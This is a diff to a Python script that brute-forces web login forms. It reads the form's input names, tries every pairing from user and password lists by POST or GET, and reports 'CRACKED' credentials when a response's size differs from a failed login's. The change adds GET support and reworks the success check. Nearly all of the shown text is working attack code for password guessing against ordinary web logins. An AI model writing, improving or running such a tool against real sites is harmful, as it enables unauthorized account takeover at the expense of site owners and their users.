@@ -99,6 +99,7 @@ def check_login_form(form):
 """
 def brute_force(post_url, login_form, user_list, password_list):
     input_list = login_form.findAll("input")
+    method = login_form.get("method")
     user_name = input_list[0].get("name")
     pass_name = input_list[1].get("name")
     post_data = {}
@@ -106,9 +107,8 @@ def brute_force(post_url, login_form, user_list, password_list):
     post_data[user_name] = ""
     post_data[pass_name] = ""
 
-    result = requests.post(post_url, data=post_data)
-    result_size = len(result.content)
-    reset_flag = 0
+    result = requests.post(post_url, data=post_data) if(method == "post") else requests.get(post_url, params=post_data)
+    fail_result_size = len(result.content)
 
     print("\nStarting Bruteforce Attack...")
     print("Press Ctrl+C to quit...\n\n")
@@ -124,19 +124,13 @@ def brute_force(post_url, login_form, user_list, password_list):
                     post_data[user_name] = username
                     post_data[pass_name] = password
 
-                    result = requests.post(post_url, data=post_data)
-
-                    prev_result_size = result_size
+                    result = requests.post(post_url, data=post_data) if(method == "post") else requests.get(post_url, params=post_data)
                     result_size = len(result.content)
 
-                    if((abs(prev_result_size - result_size) > 100) and (result_size > 500)):
-                        if(reset_flag == 0):
-                            print("[+] CRACKED!!! Username: {}, Password: {}".format(username, password))
-                            print("\n\nTrying other login credentials...\n\n")
-                            reset_flag = 1
-
-                        else:
-                            reset_flag = 0
+                    if((abs(result_size - fail_result_size) > 100) and (result_size > 200)):
+                        print("[+] CRACKED!!! Username: {}, Password: {}".format(username, password))
+                        print("\n\nTrying other login credentials...\n\n")
+                        reset_flag = 1
 
 
 if __name__ == "__main__":
